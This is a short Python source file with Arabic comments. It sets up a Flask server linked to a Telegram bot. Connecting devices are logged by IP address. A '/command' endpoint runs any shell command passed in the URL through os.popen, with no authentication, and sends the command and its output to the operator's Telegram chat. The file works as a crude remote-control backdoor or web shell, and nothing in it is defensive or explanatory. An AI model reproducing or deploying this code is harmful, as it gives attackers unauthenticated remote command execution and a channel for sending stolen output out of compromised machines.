import os
from flask import Flask, request, jsonify, render_template
import telebot
import config  # استيراد الإعدادات

# تهيئة بوت تيليجرام
bot = telebot.TeleBot(config.BOT_TOKEN)
app = Flask(__name__)

# قائمة الأجهزة المتصلة
connected_devices = {}

# 🔹 عند فتح الجهاز للصفحة يتم إبلاغ البوت بأنه متصل
@app.route('/connect', methods=['GET'])
def connect_device():
    device_id = request.remote_addr  # استخدام IP الجهاز المتصل
    connected_devices[device_id] = True
    bot.send_message(config.CHAT_ID, f"✅ جهاز جديد متصل: {device_id}\nيمكنك الآن التحكم فيه عبر الأزرار.")
    return jsonify({"message": "✅ الجهاز متصل بالخادم!"})

# 🔹 تنفيذ الأوامر على الجهاز المتصل
@app.route('/command', methods=['GET'])
def execute_command():
    cmd = request.args.get('cmd')
    if not cmd:
        return jsonify({"error": "❌ يرجى إدخال الأمر"}), 400

    if not connected_devices:
        return jsonify({"error": "❌ لا يوجد أجهزة متصلة حالياً"}), 400

    try:
        output = os.popen(cmd).read()
        bot.send_message(config.CHAT_ID, f"📜 تنفيذ أمر:\n`{cmd}`\n🔹 النتيجة:\n```\n{output}\n```", parse_mode="Markdown")
        return jsonify({"status": "✅ تم تنفيذ الأمر بنجاح!", "output": output})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# تشغيل الخادم
if __name__ == '__main__':
    app.run(host=config.HOST, port=config.PORT)
